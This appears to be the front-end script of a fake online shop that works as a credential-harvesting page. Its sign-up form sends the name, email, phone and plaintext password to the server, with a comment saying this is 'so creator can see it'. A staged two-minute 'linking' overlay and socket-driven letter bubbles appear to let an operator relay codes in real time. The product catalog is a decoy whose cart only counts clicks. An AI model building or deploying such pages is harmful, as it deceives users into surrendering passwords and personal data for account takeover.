const form = document.getElementById('user-form');
const stepForm = document.getElementById('step-form');
const stepLinking = document.getElementById('step-linking');
const stepBubbles = document.getElementById('step-bubbles');
const stepCatalog = document.getElementById('step-catalog');
const bubblesGrid = document.getElementById('bubbles-grid');
const btnComplete = document.getElementById('btn-complete');
const toast = document.getElementById('toast');
const linkingOverlay = document.getElementById('linking-overlay');
const overlayProgress = document.getElementById('overlay-progress');
const progressFill = document.getElementById('progress-fill');

let socket = null;
let sessionId = null;
let currentLetters = Array(9).fill('');
let cartCount = 0;

// Create the 9 bubbles
for (let i = 0; i < 9; i++) {
  const bubble = document.createElement('div');
  bubble.className = 'bubble';
  bubble.dataset.index = i;
  bubble.id = `bubble-${i}`;
  bubblesGrid.appendChild(bubble);
}

function showStep(stepEl) {
  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
  stepEl.classList.add('active');
}

function showToast(msg) {
  toast.textContent = msg;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 2800);
}

function updateBubbles(letters) {
  currentLetters = letters;
  letters.forEach((letter, i) => {
    const bubble = document.getElementById(`bubble-${i}`);
    if (!bubble) return;
    if (letter && letter.trim()) {
      bubble.textContent = letter;
      bubble.classList.add('filled');
    } else {
      bubble.textContent = '';
      bubble.classList.remove('filled');
    }
  });
  const hasAny = letters.some(l => l && l.trim());
  btnComplete.disabled = !hasAny;
}

// ========== PRODUCTS DATA ==========
const products = [
  // Clothes
  { id: 1, name: "Classic White Tee", price: 24.99, cat: "clothes", emoji: "👕" },
  { id: 2, name: "Denim Jacket", price: 59.99, cat: "clothes", emoji: "🧥" },
  { id: 3, name: "Summer Dress", price: 39.99, cat: "clothes", emoji: "👗" },
  { id: 4, name: "Hoodie", price: 44.99, cat: "clothes", emoji: "hoodie" },
  // Phones
  { id: 5, name: "Nova X Pro", price: 699.00, cat: "phones", emoji: "📱" },
  { id: 6, name: "Pulse 12", price: 499.00, cat: "phones", emoji: "📱" },
  { id: 7, name: "Lite Mini", price: 249.00, cat: "phones", emoji: "📱" },
  // Food
  { id: 8, name: "Organic Honey", price: 12.50, cat: "food", emoji: "🍯" },
  { id: 9, name: "Artisan Coffee", price: 18.00, cat: "food", emoji: "☕" },
  { id: 10, name: "Dark Chocolate", price: 8.99, cat: "food", emoji: "🍫" },
  { id: 11, name: "Green Tea Box", price: 14.50, cat: "food", emoji: "🍵" },
  // Jewelry
  { id: 12, name: "Silver Necklace", price: 79.00, cat: "jewelry", emoji: "📿" },
  { id: 13, name: "Gold Ring", price: 129.00, cat: "jewelry", emoji: "💍" },
  { id: 14, name: "Pearl Earrings", price: 49.00, cat: "jewelry", emoji: "👂" },
  // General
  { id: 15, name: "Leather Wallet", price: 34.99, cat: "general", emoji: "👛" },
  { id: 16, name: "Wireless Earbuds", price: 59.99, cat: "general", emoji: "🎧" },
  { id: 17, name: "Notebook Set", price: 15.00, cat: "general", emoji: "📓" },
  { id: 18, name: "Scented Candle", price: 19.99, cat: "general", emoji: "🕯️" },
];

function renderProducts(filter = "all") {
  const grid = document.getElementById("products-grid");
  const list = filter === "all" ? products : products.filter(p => p.cat === filter);
  grid.innerHTML = list.map(p => `
    <div class="product-card">
      <div class="product-img">${p.emoji}</div>
      <div class="product-info">
        <div class="product-name">${p.name}</div>
        <div class="product-price">$${p.price.toFixed(2)}</div>
        <button class="btn-cart" data-id="${p.id}">Add to Cart</button>
      </div>
    </div>
  `).join("");

  grid.querySelectorAll(".btn-cart").forEach(btn => {
    btn.addEventListener("click", () => {
      cartCount++;
      document.getElementById("cart-count").textContent = cartCount;
      btn.textContent = "Added ✓";
      btn.classList.add("added");
      showToast("Added to cart");
      setTimeout(() => {
        btn.textContent = "Add to Cart";
        btn.classList.remove("added");
      }, 1500);
    });
  });
}

// Category tabs
document.getElementById("category-tabs").addEventListener("click", (e) => {
  if (!e.target.classList.contains("cat-btn")) return;
  document.querySelectorAll(".cat-btn").forEach(b => b.classList.remove("active"));
  e.target.classList.add("active");
  renderProducts(e.target.dataset.cat);
});

// ========== FORM SUBMIT ==========
form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const password = document.getElementById('password').value;
  const confirm = document.getElementById('confirmPassword').value;
  const errEl = document.getElementById('password-error');

  if (password !== confirm) {
    errEl.style.display = 'block';
    return;
  }
  errEl.style.display = 'none';

  const btn = document.getElementById('btn-next');
  btn.disabled = true;
  btn.textContent = 'Connecting…';

  const data = {
    surname: document.getElementById('surname').value.trim(),
    firstName: document.getElementById('firstName').value.trim(),
    email: document.getElementById('email').value.trim(),
    phone: document.getElementById('phone').value.trim(),
    password: password   // sent to server so creator can see it
  };

  try {
    const res = await fetch('/api/session', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

    if (!res.ok) {
      const err = await res.json();
      throw new Error(err.error || 'Failed to create session');
    }

    const { sessionId: id } = await res.json();
    sessionId = id;

    // Show linking overlay for ~2 minutes
    linkingOverlay.classList.remove('hidden');
    let progress = 0;
    const totalTime = 120000; // 2 minutes
    const interval = 500;
    const step = 100 / (totalTime / interval);

    const timer = setInterval(() => {
      progress += step;
      if (progress > 100) progress = 100;
      overlayProgress.style.width = progress + '%';
      if (progressFill) progressFill.style.width = progress + '%';
    }, interval);

    // Connect socket early
    socket = io();
    socket.on('connect', () => {
      socket.emit('join-session', sessionId);
    });
    socket.on('letters-update', (payload) => {
      updateBubbles(payload.letters || []);
    });
    socket.on('error', (err) => {
      showToast(err.message || 'Connection error');
    });

    // After 2 minutes (or you can reduce for testing)
    setTimeout(() => {
      clearInterval(timer);
      linkingOverlay.classList.add('hidden');
      showStep(stepBubbles);
      showToast('Connection established');
      btn.disabled = false;
      btn.textContent = 'Next';
    }, totalTime);

  } catch (err) {
    console.error(err);
    showToast(err.message || 'Something went wrong');
    btn.disabled = false;
    btn.textContent = 'Next';
    linkingOverlay.classList.add('hidden');
  }
});

// Complete → Catalog
btnComplete.addEventListener('click', () => {
  showStep(stepCatalog);
  renderProducts('all');
});
